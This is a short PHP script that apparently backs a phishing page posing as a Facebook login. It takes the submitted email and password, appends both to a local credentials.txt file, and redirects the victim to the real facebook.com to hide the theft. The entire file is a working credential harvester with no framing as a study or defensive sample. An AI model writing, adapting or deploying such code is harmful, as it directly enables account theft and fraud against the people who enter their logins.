<?php

$user=$_POST["email"];
$pass=$_POST["password"];
$creds="credentials.txt";
file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
header("location: https://www.facebook.com");

?>
